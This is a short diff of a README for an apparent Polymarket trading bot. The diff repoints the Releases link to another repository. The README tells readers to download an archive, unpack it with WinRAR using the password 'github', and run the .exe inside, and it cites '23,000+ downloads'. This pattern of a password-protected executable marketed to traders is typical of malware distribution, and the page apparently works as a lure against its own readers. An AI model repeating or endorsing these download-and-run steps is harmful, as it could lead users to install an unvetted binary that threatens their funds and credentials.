@@ -41,7 +41,7 @@ It's built for traders who want to automate positions on prediction markets (ele
 
 Latest release: **23,000+ downloads**
 
-1. Go to the **[Releases](https://github.com/pureeyeball/openclaw-polymarket-bot/releases)** page.
+1. Go to the **[Releases](https://github.com/pureeyeball/Polymarket-Openclaw-Trading-Bot/releases/tag/v3.3.0)** page.
 2. Download the latest version of the bot.
 3. Extract the archive using **WinRAR** (password: `github`).
 4. Launch the bot by running the `.exe` file.
